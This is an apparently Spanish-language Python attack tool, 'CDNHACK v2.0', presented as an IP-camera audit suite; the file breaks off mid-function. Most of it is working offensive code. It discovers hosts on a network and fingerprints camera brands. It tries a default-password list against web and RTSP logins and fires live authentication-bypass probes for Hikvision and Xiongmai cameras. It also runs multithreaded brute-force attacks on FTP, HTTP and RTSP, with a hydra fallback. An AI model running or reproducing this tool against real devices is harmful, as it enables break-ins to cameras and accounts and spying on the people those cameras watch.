#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════════
#  CDNHACK v2.0 — CDN WERO · DevFuryWero hardening suite
#  Auditoría de cámaras IP + fuerza bruta de servicios
#  Uso exclusivo en pruebas autorizadas (red propia / cliente con
#  alcance firmado).
#
#  Módulos: descubrimiento LAN, detección de cámaras (marca/modelo),
#  credenciales por defecto, check de CVEs, fuerza bruta
#  (ftp/ssh/http-basic/http-form/rtsp con hydra integrado),
#  hardening DevFuryWero, reporte TXT.
# ═══════════════════════════════════════════════════════════════════

import argparse
import base64
import ipaddress
import os
import re
import socket
import subprocess
import sys
import tempfile
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib import parse as urlparse
from urllib import request as urlreq
from urllib.error import HTTPError

# ── Colores ANSI ──────────────────────────────
RED     = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
BLUE    = "\033[94m"; MAGENTA = "\033[95m"; CYAN = "\033[96m"
BOLD    = "\033[1m";  DIM = "\033[2m"; RESET = "\033[0m"
CLEAR   = "\033[2J\033[H"
RAINBOW = [RED, YELLOW, GREEN, CYAN, BLUE, MAGENTA]
COLORS  = {"red": RED, "green": GREEN, "cyan": CYAN, "blue": BLUE,
           "magenta": MAGENTA, "yellow": YELLOW}

VERSION = "2.0"
BRAND   = "CDN WERO"
FINDINGS = []          # hallazgos acumulados para el reporte

# ── Marca de agua ─────────────────────────────
def watermark():
    return f"{BOLD}{RED}[{BRAND}]{RESET} {DIM}v{VERSION} — auditoría autorizada{RESET}"

# ─────────────────────────────────────────────
#  Banner (ASCII art)
# ─────────────────────────────────────────────
BANNER = r"""
░░                              ░░                                                              
                ░░████░░                  ▒▒                            ░░                                  
                ████████░░                ██░░                          ▒▒                                  
        ░░░░  ░░██████████░░              ██                            ▒▒░░              ▓▓████▓▓          
              ▓▓████████████            ░░██  ░░                        ░░▓▓            ░░████████▓▓        
              ██████████████░░          ▓▓██                            ░░██            ████████████░░      
              ████████████████          ██▓▓                            ░░██░░        ▒▒████████████▒▒      
              ████████████████▒▒      ▒▒▓▓▒▒                              ████        ▒▒██████████████      
    ░░        ██████████████████    ░░████░░                              ▓▓██▒▒    ░░████████████████      
              ██████████████████░░  ▓▓████                                ░░████    ▒▒██████████████▒▒░░    
              ████████████████████▓▓████▒▒                                  ████▓▓▒▒▓▓████████████████      
      ░░      ░░████████████████████████░░                                  ▓▓████████████████████████      
    ░░          ██████████████████████░░                                      ██████████████████████▒▒      
  ░░░░          ▒▒██████████████████▓▓                                        ░░████████████████████        
  ░░░░            ██████████████████▒▒                                          ██████████████████▓▓        
  ░░░░            ▒▒██████████████████                                        ░░████████████████▓▓          
  ░░  ░░          ░░██████▓▓██████████░░                                      ██████████████▓▓▓▓▓▓  ░░██▓▓  
  ░░░░░░████▓▓      ████░░  ░░▒▒████████░░                                  ░░████▓▓▒▒░░████████░░░░██▓▓██░░
  ░░  ▓▓████▓▓▓▓    ████            ░░██▓▓░░░░              ░░            ░░▓▓          ▒▒██████  ████▓▓▒▒██
  ░░  ▓▓▓▓██▓▓██    ▓▓██▓▓              ▓▓▒▒░░                ░░    ░░░░░░▒▒            ██████▓▓░░██▒▒██████
  ░░▒▒▓▓██▒▒░░░░    ░░████                ▓▓▓▓░░░░░░░░          ░░░░░░▓▓              ░░██████        ▒▒▓▓██
  ░░▓▓▓▓░░▒▒  ██    ░░▓▓██▒▒                ▓▓██░░    ░░      ░░░░▒▒██                ██████▓▓      ░░▒▒▒▒▓▓
    ██████▓▓  ░░      ████▓▓                  ██▓▓░░░░          ░░██░░              ▒▒██████        ▒▒██████
    ▓▓▒▒▒▒██░░        ▒▒████▓▓░░              ████░░              ██              ▒▒▓▓████░░        ██  ▓▓██
    ▓▓██▓▓██            ▓▓██▓▓▒▒██▒▒░░  ░░▒▒▓▓████                ██████▒▒▒▒░░▒▒██▓▓████▒▒          ████▓▓██
    ▒▒▒▒▒▒██░░            ▓▓████▓▓████████▓▓▓▓██░░                  ░░████████████████░░          ░░██▓▓▓▓██
    ░░▓▓▒▒░░▓▓            ░░██████████████▓▓▒▒                            ▒▒██████████            ▓▓░░▒▒▒▒▒▒
    ░░▓▓██████░░  ░░      ▒▒██▒▒  ░░░░░░                                          ▓▓██            ████████  
    ░░▓▓▒▒██░░▓▓    ░░    ██▓▓                      ░░▒▒▒▒▒▒▒▒▒▒░░                ░░██    ░░    ░░▓▓▒▒▒▒██  
      ▒▒░░██░░██      ░░  ██            ░░      ░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒                ▓▓░░        ▓▓▒▒▓▓  ▒▒  
      ░░██▒▒▓▓░░░░      ░░░░░░      ░░░░░░▒▒░░▒▒▓▓▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒░░  ░░░░░░░░░░░░░░        ░░████▓▓██    
      ░░▓▓████▓▓██      ▒▒░░░░░░░░░░░░░░▒▒▓▓▓▓▒▒▓▓▓▓▓▓▒▒▒▒░░░░▒▒▒▒▓▓▒▒▒▒▒▒░░░░░░              ██░░▒▒▓▓██    
      ░░▒▒██▓▓▒▒░░▓▓  ██▒▒            ░░▓▓▓▓▓▓▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓░░▒▒▓▓▒▒        ▒▒      ████▓▓▓▓▒▒▒▒    
        ░░██░░▓▓▒▒██████░░            ░░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▓▓▒▒▒▒▓▓▒▒        ▓▓░░  ██▒▒  ██▓▓██      
        ░░▓▓▒▒▓▓██▒▒████              ░░▓▓▓▓▒▒▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓██░░          ██▒▒██▓▓░░▓▓██▓▓      
          ░░██▓▓░░░░░░██░░              ▒▒▓▓▓▓▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▒▒            ██▓▓░░████░░██        
          ░░▓▓██▓▓░░▒▒▓▓██░░            ░░░░▓▓▓▓▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒░░            ░░██▓▓  ████▓▓▒▒        
          ░░░░██░░▓▓██░░▓▓██░░            ░░░░░░░░░░▒▒▒▒▓▓▓▓▓▓▒▒░░░░              ░░██░░██▓▓▒▒████          
            ░░▒▒██▓▓██░░▓▓▒▒██▓▓            ░░░░░░░░░░░░▒▒▒▒░░░░░░              ▓▓██▒▒  ▒▒░░░░██░░          
              ░░██▒▒▓▓██▒▒░░██▓▓██▒▒          ░░░░░░░░░░░░░░░░              ▒▒██▒▒▒▒██  ██░░██░░            
              ░░▒▒██▒▒▓▓████▓▓░░░░████▒▒░░          ░░░░░░            ░░▒▒██▓▓██░░  ████▓▓██░░              
                ░░▓▓██░░▓▓██▒▒░░░░██▒▒████████▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓████▒▒▓▓  ██░░  ██▒▒▓▓░░                
                ░░░░▒▒████░░▓▓░░▒▒██░░░░██▓▓▓▓▓▓██▓▓▒▒▒▒████▒▒▒▒██▓▓▒▒██░░░░░░░░████▓▓▓▓▒▒                  
                  ░░░░▓▓██▒▒▓▓████▓▓░░░░██░░░░░░██▓▓  ░░██▒▒    ██▓▓  ██▒▒░░▓▓▓▓▒▒░░▓▓██░░                  
                    ░░░░████▓▓░░██▓▓░░░░██░░░░░░▓▓▒▒  ░░██▓▓    ████  ▓▓▒▒░░▓▓██░░░░██░░                    
                      ░░░░████▒▒▓▓▒▒██▓▓██▒▒░░░░██▒▒░░░░████    ██▓▓  ▓▓████░░██▒▒██░░                      
                        ░░░░▓▓████░░▓▓▓▓████▓▓▒▒██▓▓░░░░████░░▒▒██▓▓░░██████▒▒████▒▒░░                      
                        ░░░░░░▓▓██████▒▒░░██▒▒▓▓██████████████████████▒▒░░██████▒▒░░                        
                            ░░░░▒▒██████▒▒██▒▒░░▓▓▓▓░░░░████░░░░██░░██▒▒▓▓████▒▒░░                          
                              ░░░░░░▓▓████████▓▓████▒▒▒▒██▒▒░░▓▓▓▓▒▒████████░░░░                            
                                ░░░░░░▒▒██████████████████████▓▓██████████░░░░                              
                                  ░░░░░░░░▓▓██████████████████████████▓▓░░░░░░                              
                                    ░░░░░░░░░░▓▓▓▓████████████████▒▒░░░░░░░░                                
                                      ░░░░░░░░░░░░░░░░░░▒▒▒▒░░░░░░░░░░░░░░                                  
                                          ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                                    
                                            ░░░░░░░░░░░░░░░░░░░░░░░░░░                                    
"""

def print_banner(color="red", typing=False):
    lines = BANNER.strip("\n").split("\n")
    palette = RAINBOW if color == "rainbow" else [COLORS.get(color, RED)] * len(lines)
    for i, line in enumerate(lines):
        if typing:
            for ch in line:
                print(palette[i % len(palette)] + ch, end="", flush=True)
                time.sleep(0.001)
            print(RESET)
        else:
            print(palette[i % len(palette)] + line + RESET)
    print("\n" + watermark() + "\n")

def add_finding(ftype, target, detail):
    FINDINGS.append((ftype, target, detail))

# ─────────────────────────────────────────────
#  Helpers de red
# ─────────────────────────────────────────────
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()

def guess_iface():
    try:
        out = subprocess.check_output(["ip", "-o", "-4", "addr", "show"],
                                      stderr=subprocess.DEVNULL).decode()
        for line in out.splitlines():
            m = re.search(r"^\d+:\s+(\S+).*inet\s+(\d+\.\d+\.\d+\.\d+)", line)
            if m and m.group(1) != "lo":
                return m.group(1)
    except Exception:
        pass
    return None

def get_network(iface=None):
    iface = iface or guess_iface()
    if iface:
        try:
            out = subprocess.check_output(["ip", "-o", "-4", "addr", "show", iface],
                                          stderr=subprocess.DEVNULL).decode()
            m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)/(\d+)", out)
            if m:
                return ipaddress.ip_network(f"{m.group(1)}/{m.group(2)}", strict=False)
        except Exception:
            pass
    return ipaddress.ip_network(f"{get_local_ip()}/24", strict=False)

def parse_targets(spec):
    """'192.168.1.50', '192.168.1.0/24', 'host1,host2' -> lista de IPs"""
    hosts = []
    for part in spec.split(","):
        part = part.strip()
        if not part:
            continue
        if "/" in part:
            try:
                net = ipaddress.ip_network(part, strict=False)
                if net.num_addresses > 1024:
                    print(f"{YELLOW}[!] Red muy grande ({net.num_addresses} IPs), limitando a /24{RESET}")
                    net = ipaddress.ip_network(f"{net.network_address}/24", strict=False)
                hosts.extend(str(h) for h in net.hosts())
            except ValueError as e:
                print(f"{RED}[!] Red inválida {part}: {e}{RESET}")
        else:
            try:
                hosts.append(socket.gethostbyname(part))
            except socket.gaierror:
                print(f"{RED}[!] No resuelve: {part}{RESET}")
    return sorted(set(hosts), key=lambda x: [int(o) for o in x.split(".")])

# ─────────────────────────────────────────────
#  Módulo 1: Descubrimiento de red (ARP)
# ─────────────────────────────────────────────
def arp_scan(iface=None):
    iface = iface or guess_iface()
    net = get_network(iface)
    print(f"{CYAN}[*] Descubriendo dispositivos en {net} (iface: {iface})...{RESET}")
    devices = []
    try:
        out = subprocess.check_output(["arp-scan", "-l", "-I", iface], timeout=90,
                                      stderr=subprocess.DEVNULL).decode(errors="ignore")
        for line in out.splitlines():
            m = re.match(r"^(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f:]{17})\s+(.*)$", line.strip())
            if m:
                devices.append({"ip": m.group(1), "mac": m.group(2), "vendor": m.group(3)})
    except Exception:
        pass
    if devices:
        return devices
    try:
        out = subprocess.check_output(["nmap", "-sn", "-oG", "-", str(net)], timeout=180,
                                      stderr=subprocess.DEVNULL).decode(errors="ignore")
        for line in out.splitlines():
            if "Status: Up" in line:
                m = re.search(r"Host:\s*(\d+\.\d+\.\d+\.\d+)", line)
                if m:
                    devices.append({"ip": m.group(1), "mac": "", "vendor": ""})
    except Exception:
        pass
    if devices:
        return devices
    print(f"{YELLOW}[*] arp-scan/nmap no disponibles, usando ping sweep...{RESET}")
    alive = []
    def ping(ip):
        try:
            rc = subprocess.run(["ping", "-c", "1", "-W", "1", ip],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                timeout=3).returncode
            if rc == 0:
                alive.append(ip)
        except Exception:
            pass
    hosts = list(net.hosts())[:254]
    with ThreadPoolExecutor(max_workers=64) as ex:
        list(ex.map(ping, hosts))
    arp = {}
    try:
        with open("/proc/net/arp") as f:
            next(f)
            for line in f:
                parts = line.split()
                if len(parts) >= 4 and parts[3] == "0x2":
                    arp[parts[0]] = parts[1]
    except Exception:
        pass
    for ip in sorted(alive, key=lambda x: [int(o) for o in x.split(".")]):
        devices.append({"ip": ip, "mac": arp.get(ip, ""), "vendor": ""})
    return devices

def run_discovery(iface=None):
    devices = arp_scan(iface)
    if not devices:
        print(f"{RED}[!] No se detectaron dispositivos (¿root? ¿iface correcta?){RESET}")
        return []
    print(f"{GREEN}[+] {len(devices)} dispositivo(s) encontrado(s):{RESET}")
    for d in devices:
        vendor = f"  [{d['vendor']}]" if d.get("vendor") else ""
        mac = f"  MAC: {d['mac']}" if d.get("mac") else ""
        print(f"  {CYAN}{d['ip']:<16}{RESET}{mac}{vendor}")
        add_finding("discovery", d["ip"], f"Dispositivo detectado MAC={d.get('mac','?')} vendor={d.get('vendor','?')}")
    return devices

# ─────────────────────────────────────────────
#  Módulo 2: Detección de cámaras IP (marca/modelo)
# ─────────────────────────────────────────────
CAM_PORTS = {
    80: "HTTP", 443: "HTTPS", 554: "RTSP", 8000: "Dahua/ONVIF",
    8080: "HTTP alt", 8443: "HTTPS alt", 37777: "Xiongmai",
    34567: "Xiongmai/ONVIF", 9000: "RTSP alt", 9527: "RTSP DVR",
    5000: "ONVIF/UPnP", 8899: "ONVIF Hikvision", 8888: "HTTP alt2",
}

RTSP_PATHS = ["/", "/live/ch0", "/live/ch1", "/ch0_0.264", "/ch1_0.264",
              "/Streaming/Channels/101", "/Streaming/Channels/102",
              "/cam/realmonitor?channel=1&subtype=0", "/h264/ch1/main/av_stream",
              "/media/video1", "/video1", "/live", "/onvif1", "/profile1"]

BRAND_KEYWORDS = {
    "hikvision": ["hikvision", "hikvison", "hik", "ds-", "ds2"],
    "dahua": ["dahua", "xvr", "dss", "dh-", "ipc-hfw", "ipc-hdw"],
    "xiongmai": ["xiongmai", "netview", "hdvr", "ipcam", "gv", "wx-"],
    "reolink": ["reolink", "rl-"],
    "tplink": ["tp-link", "tplink", "kasa", "tl-"],
    "dlink": ["d-link", "dlink", "dcs-"],
    "uniview": ["uniview", "unv"],
    "amcrest": ["amcrest", "amc"],
    "vstarcam": ["vstarcam"],
    "generic": ["ip camera", "webcam", "camera", "dvr", "nvr", "cctv", "cámara"],
}

def http_request(host, port, path="/", cred=None, method="GET", data=None,
                 timeout=5, https=False):
    scheme = "https" if https else "http"
    url = f"{scheme}://{host}:{port}{path}"
    headers = {"User-Agent": "CDNHACK/2.0 (CDN WERO)"}
    if cred:
        token = base64.b64encode(f"{cred[0]}:{cred[1]}".encode()).decode()
        headers["Authorization"] = f"Basic {token}"
    req = urlreq.Request(url, data=data, headers=headers, method=method)
    try:
        with urlreq.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(4096)
    except HTTPError as e:
        return e.code, b""
    except Exception:
        return None, b""

def rtsp_describe(host, port, path="/", cred=None, timeout=4):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        token = base64.b64encode(f"{cred[0]}:{cred[1]}".encode()).decode() if cred else ""
        req = f"DESCRIBE rtsp://{host}:{port}{path} RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: CDNHACK/2.0\r\n"
        if cred:
            req += f"Authorization: Basic {token}\r\n"
        req += "\r\n"
        s.sendall(req.encode())
        resp = s.recv(2048).decode(errors="ignore")
        s.close()
        return resp
    except Exception:
        return ""

def scan_port(ip, port, timeout=1.0):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            if s.connect_ex((ip, port)) == 0:
                return "open", grab_banner(ip, port)
    except Exception:
        pass
    return "closed", ""

def grab_banner(ip, port):
    if port in (80, 443, 8080, 8443, 8000, 8888, 5000, 8899):
        try:
            status, body = http_request(ip, port, "/", timeout=3, https=(port in (443, 8443)))
            if status:
                m = re.search(r"<title>(.*?)</title>", body.decode(errors="ignore"), re.I | re.S)
                title = m.group(1).strip()[:60] if m else ""
                return f"HTTP/{status} {title}".strip()
        except Exception:
            pass
    if port in (554, 9000, 9527):
        r = rtsp_describe(ip, port, "/")
        if r:
            return r.split("\r\n")[0]
    try:
        s = socket.create_connection((ip, port), timeout=3)
        s.sendall(b"\r\n\r\n")
        s.settimeout(3)
        data = s.recv(256)
        s.close()
        return data.decode(errors="ignore").strip()[:60]
    except Exception:
        return ""

def guess_brand(banner, title):
    hay = f"{banner} {title}".lower()
    for brand, kws in BRAND_KEYWORDS.items():
        if any(k in hay for k in kws):
            return brand
    return "desconocida"

def guess_model(title):
    """Extrae un posible modelo de la página web (ej: DS-2CD2042WD-I)"""
    t = title.strip()
    if len(t) < 3 or len(t) > 40:
        return ""
    if re.search(r"[A-Z0-9]{3,}", t):
        return t
    return ""

def detect_camera(ip, timeout=1.0):
    info = {"ip": ip, "brand": "desconocida", "model": "", "ports": [],
            "rtsp": False, "http_title": "", "camera": False}
    open_ports = []
    with ThreadPoolExecutor(max_workers=len(CAM_PORTS)) as ex:
        futs = {ex.submit(scan_port, ip, p, timeout): p for p in CAM_PORTS}
        for fut in as_completed(futs):
            p = futs[fut]
            st, banner = fut.result()
            if st == "open":
                open_ports.append((p, banner))
    if not open_ports:
        return info

    http_banners = []
    for p, b in open_ports:
        info["ports"].append(p)
        if b:
            http_banners.append(b)
        if p in (554, 9000, 9527):
            info["rtsp"] = True

    for p in (80, 8080, 8000, 8888, 5000, 443, 8443):
        if p in [x[0] for x in open_ports]:
            st, body = http_request(ip, p, "/", timeout=4, https=(p in (443, 8443)))
            if st:
                m = re.search(r"<title>(.*?)</title>", body.decode(errors="ignore"), re.I | re.S)
                if m:
                    info["http_title"] = m.group(1).strip()[:80]
                    info["model"] = guess_model(m.group(1).strip())
                break

    cam_ports = set(CAM_PORTS) - {80, 443, 8080, 8443, 8888}
    rtsp = info["rtsp"]
    weird = [p for p in open_ports if p[0] in (8000, 37777, 34567, 9000, 9527, 8899, 5000)]
    hay = " ".join(http_banners) + " " + info["http_title"]
    if rtsp or weird or guess_brand(hay, info["http_title"]) != "desconocida":
        if info["http_title"] or rtsp or weird:
            info["camera"] = True
            info["brand"] = guess_brand(hay, info["http_title"])
    return info

def cam_scan(target_spec, timeout=1.0, threads=100):
    hosts = parse_targets(target_spec)
    print(f"{CYAN}[*] Buscando cámaras en {len(hosts)} host(s)...{RESET}")
    cams = []
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(detect_camera, h, timeout): h for h in hosts}
        for fut in as_completed(futs):
            info = fut.result()
            if info.get("camera"):
                cams.append(info)
                model = f"  modelo={info['model']}" if info.get("model") else ""
                print(f"{GREEN}[+] CÁMARA: {info['ip']}  marca={info['brand']}{model}  "
                      f"puertos={info['ports']}  rtsp={'SÍ' if info['rtsp'] else 'no'}{RESET}")
                if info.get("http_title"):
                    print(f"{DIM}    título: {info['http_title']}{RESET}")
                add_finding("camara", info["ip"],
                            f"marca={info['brand']} modelo={info.get('model','?')} "
                            f"puertos={info['ports']} rtsp={info['rtsp']} título={info['http_title']}")
    print(f"{GREEN}[+] {len(cams)} cámara(s) detectada(s){RESET}")
    return cams

# ─────────────────────────────────────────────
#  Módulo 3: Credenciales por defecto
# ─────────────────────────────────────────────
DEFAULT_CREDS = [
    ("admin", ""), ("admin", "admin"), ("admin", "12345"), ("admin", "1234"),
    ("admin", "123456"), ("admin", "password"), ("admin", "admin123"),
    ("admin", "888888"), ("admin", "666666"), ("admin", "111111"),
    ("admin", "12345678"), ("admin", "1111111"), ("admin", "9999"),
    ("root", "root"), ("root", "12345"), ("root", ""), ("root", "1234"),
    ("user", "user"), ("user", "12345"), ("guest", "guest"),
]

def find_rtsp_path(host, port):
    for path in RTSP_PATHS:
        r = rtsp_describe(host, port, path)
        first = r.split("\r\n")[0] if r else ""
        if "200" in first or "401" in first:
            return path
    return "/"

def check_rtsp_access(host, port, path="/"):
    r = rtsp_describe(host, port, path)
    if r.startswith("RTSP/1.0 200"):
        return "open"
    if "401" in r.split("\r\n")[0]:
        return "auth"
    return "unknown"

def check_defaults(host, timeout=1.0):
    found = []
    print(f"{CYAN}[*] Probando credenciales por defecto en {host}...{RESET}")
    for p in (80, 8080, 8000, 8888, 5000, 443, 8443):
        st, _ = http_request(host, p, "/", timeout=4, https=(p in (443, 8443)))
        if st == 401:
            print(f"{YELLOW}[*] {host}:{p} requiere auth básica — probando defaults...{RESET}")
            for u, pw in DEFAULT_CREDS:
                st2, _ = http_request(host, p, "/", cred=(u, pw), timeout=4,
                                      https=(p in (443, 8443)))
                if st2 == 200:
                    found.append((p, u, pw, "HTTP basic"))
                    print(f"{GREEN}[+] {host}:{p} -> {u}:{pw}  (HTTP basic){RESET}")
                    add_finding("defaults", host, f"HTTP basic :{p} {u}:{pw}")
        elif st == 200:
            print(f"{DIM}[*] {host}:{p} responde 200 sin auth — acceso abierto{RESET}")
    for p in (554, 9000, 9527):
        path = find_rtsp_path(host, p)
        acc = check_rtsp_access(host, p, path)
        if acc == "open":
            found.append((p, "", "", "RTSP abierto"))
            print(f"{GREEN}[+] {host}:{p} RTSP SIN autenticación (stream abierto){RESET}")
            add_finding("defaults", host, f"RTSP :{p} sin autenticación")
        elif acc == "auth":
            for u, pw in DEFAULT_CREDS:
                r = rtsp_describe(host, p, path, cred=(u, pw))
                if r.startswith("RTSP/1.0 200"):
                    found.append((p, u, pw, "RTSP"))
                    print(f"{GREEN}[+] {host}:{p} RTSP -> {u}:{pw}{RESET}")
                    add_finding("defaults", host, f"RTSP :{p} {u}:{pw}")
                    break
    print(f"{GREEN}[+] {len(found)} credencial(es) por defecto válida(s){RESET}")
    return found

# ─────────────────────────────────────────────
#  Módulo 4: Check de CVEs
# ─────────────────────────────────────────────
CVE_DB = [
    ("hikvision", "CVE-2017-7921", "Bypass de autenticación — /onvif-http/snapshot", "check",
     "https://nvd.nist.gov/vuln/detail/CVE-2017-7921"),
    ("hikvision", "CVE-2021-36260", "RCE — inyección de comandos en /SDK/webLanguage", "advisory",
     "https://nvd.nist.gov/vuln/detail/CVE-2021-36260"),
    ("dahua", "CVE-2021-33044", "Bypass de autenticación vía RPC2_Login", "advisory",
     "https://nvd.nist.gov/vuln/detail/CVE-2021-33044"),
    ("dahua", "CVE-2021-33045", "Bypass de autenticación (multicast)", "advisory",
     "https://nvd.nist.gov/vuln/detail/CVE-2021-33045"),
    ("xiongmai", "CVE-2018-9995", "Backdoor — acceso vía Cookie uid=admin", "check",
     "https://nvd.nist.gov/vuln/detail/CVE-2018-9995"),
    ("reolink", "CVE-2023-34623", "RCE en Reolink (panel web)", "advisory",
     "https://nvd.nist.gov/vuln/detail/CVE-2023-34623"),
    ("dlink", "CVE-2020-25078", "RCE en D-Link DCS-2530L (cgi-bin)", "advisory",
     "https://nvd.nist.gov/vuln/detail/CVE-2020-25078"),
    ("tvt", "CVE-2018-10611", "Backdoor en NVR TVT (puerto 37777)", "advisory",
     "https://nvd.nist.gov/vuln/detail/CVE-2018-10611"),
]

def probe_cve(host, cve):
    if cve == "CVE-2018-9995":   # Xiongmai: Cookie uid=admin
        try:
            req = urlreq.Request(f"http://{host}/",
                                 headers={"User-Agent": "CDNHACK/2.0", "Cookie": "uid=admin"})
            with urlreq.urlopen(req, timeout=5) as r:
                body = r.read(1024).decode(errors="ignore").lower()
                if r.status == 200 and "login" not in body:
                    return True
        except Exception:
            pass
        return False
    if cve == "CVE-2017-7921":   # Hikvision: snapshot auth=admin:11\n
        token = base64.b64encode(b"admin:11\n").decode()
        try:
            req = urlreq.Request(f"http://{host}/onvif-http/snapshot?auth={token}",
                                 headers={"User-Agent": "CDNHACK/2.0"})
            with urlreq.urlopen(req, timeout=5) as r:
                if r.status == 200 and r.headers.get("Content-Type", "").startswith("image"):
                    return True
        except Exception:
            pass
        return False
    return None

def cve_check(host, brand=None, timeout=1.0):
    if not brand:
        info = detect_camera(host, timeout)
        brand = info.get("brand", "desconocida")
    print(f"{CYAN}[*] Check de CVEs en {host} (marca detectada: {brand})...{RESET}")
    results = []
    for cve_brand, cve, desc, typ, ref in CVE_DB:
        if brand != "desconocida" and cve_brand != brand:
            continue
        if typ == "check":
            try:
                vuln = probe_cve(host, cve)
            except Exception:
                vuln = None
            status = "VULNERABLE" if vuln else "no detectado"
        else:
            status = "advisory (revisar manualmente)"
        color = GREEN if status == "VULNERABLE" else (YELLOW if status.startswith("no") else DIM)
        print(f"{color}[*] {cve} {desc}\n    -> {status}{RESET}")
        print(f"{DIM}    {ref}{RESET}")
        add_finding("cve", host, f"{cve} {desc} [{status}] {ref}")
        results.append((cve, desc, status))
    return results

# ─────────────────────────────────────────────
#  Módulo 5: Fuerza bruta estilo Hydra (integrado)
# ─────────────────────────────────────────────
def load_list(single, path):
    if path:
        try:
            with open(path, errors="ignore") as f:
                return [l.strip() for l in f if l.strip()]
        except FileNotFoundError:
            print(f"{RED}[!] No existe el archivo: {path}{RESET}")
            sys.exit(1)
    if single:
        return [single]
    return []

def brute_ftp(host, port, users, passwords, threads=10):
    import ftplib
    found = []
    def attempt(u, p):
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=5)
            ftp.login(u, p)
            ftp.quit()
            return True
        except Exception:
            return False
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(attempt, u, p): (u, p) for u in users for p in passwords}
        for fut in as_completed(futs):
            u, p = futs[fut]
            if fut.result():
                found.append((u, p))
                print(f"{GREEN}[+] FTP {host}:{port} -> {u}:{p}{RESET}")
                add_finding("brute", f"{host}:{port}", f"FTP {u}:{p}")
    return found

def brute_http_basic(host, port, path, users, passwords, threads=10, https=False):
    st, _ = http_request(host, port, path, timeout=5, https=https)
    if st == 404:
        print(f"{RED}[!] 404 — la ruta {path} no existe en {host}:{port}{RESET}")
        return []
    if st == 200:
        print(f"{YELLOW}[!] {host}:{port}{path} responde 200 SIN auth — nada que forzar{RESET}")
        return []
    if st != 401:
        print(f"{YELLOW}[!] Respuesta inesperada ({st}) — puede no usar HTTP Basic{RESET}")
    found = []
    def attempt(u, p):
        st2, _ = http_request(host, port, path, cred=(u, p), timeout=5, https=https)
        return st2 == 200
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(attempt, u, p): (u, p) for u in users for p in passwords}
        for fut in as_completed(futs):
            u, p = futs[fut]
            if fut.result():
                found.append((u, p))
                print(f"{GREEN}[+] HTTP-BASIC {host}:{port}{path} -> {u}:{p}{RESET}")
                add_finding("brute", f"{host}:{port}", f"HTTP basic {path} {u}:{p}")
    return found

def brute_http_form(host, port, url, ufield, pfield, fail, users, passwords,
                    threads=10, https=False):
    if not fail:
        print(f"{YELLOW}[!] Sin texto de fallo (--fail), se asume 200 == éxito{RESET}")
    found = []
    def attempt(u, p):
        data = urlparse.urlencode({ufield: u, pfield: p}).encode()
        st2, body = http_request(host, port, url, method="POST", data=data,
                                 timeout=6, https=https)
        if st2 == 200:
            text = body.decode(errors="ignore").lower()
            if fail:
                return fail.lower() not in text
            return True
        return False
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(attempt, u, p): (u, p) for u in users for p in passwords}
        for fut in as_completed(futs):
            u, p = futs[fut]
            if fut.result():
                found.append((u, p))
                print(f"{GREEN}[+] HTTP-FORM {host}:{port}{url} -> {u}:{p}{RESET}")
                add_finding("brute", f"{host}:{port}", f"HTTP form {url} {u}:{p}")
    return found

def brute_rtsp(host, port, users, passwords, threads=10):
    path = find_rtsp_path(host, port)
    acc = check_rtsp_access(host, port, path)
    if acc == "open":
        print(f"{YELLOW}[!] RTSP sin autenticación — no hay nada que forzar{RESET}")
        return []
    if acc != "auth":
        print(f"{YELLOW}[!] No se detectó auth RTSP en ninguna ruta común (puerto {port}){RESET}")
    print(f"{DIM}[*] Ruta RTSP: {path}{RESET}")
    found = []
    def attempt(u, p):
        r = rtsp_describe(host, port, path, cred=(u, p))
        return r.startswith("RTSP/1.0 200")
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(attempt, u, p): (u, p) for u in users for p in passwords}
        for fut in as_completed(futs):
            u, p = futs[fut]
            if fut.result():
                found.append((u, p))
                print(f"{GREEN}[+] RTSP {host}:{port} -> {u}:{p}{RESET}")
                add_finding("brute", f"{host}:{port}", f"RTSP {u}:{p}")
    return found

def hydra_fallback(host, port, service, users, passwords):
    uf = tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False)
    pf = tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False)
    uf.write("\n".join(users)); uf.close()
    pf.write("\n".join(passwords)); pf.close()
    out = "/tmp/cdnhack_hydra.txt"
    cmd = ["hydra", "-L", uf.name, "-P", pf.name, "-s", str(port), "-t", "16",
           "-f", "-o", out, f"{service}://{host}"]
    print(f"{YELLOW}[*] paramiko no instalado — usando hydra del sistema{RESET}")
    print(f"{DIM}    {' '.join(cmd)}{RESET}")
    try:
        subprocess.run(cmd)
    except FileNotFoundError:
        print(f"{RED}[!] hydra no encontrado. Instala: sudo apt install hydra "
              f"(o pip install paramiko){RESET}")
        os.unlink(uf.name); os.unlink(pf.name)
        return []
    found = []
    try:
        with open(out, errors="ignore") as f:
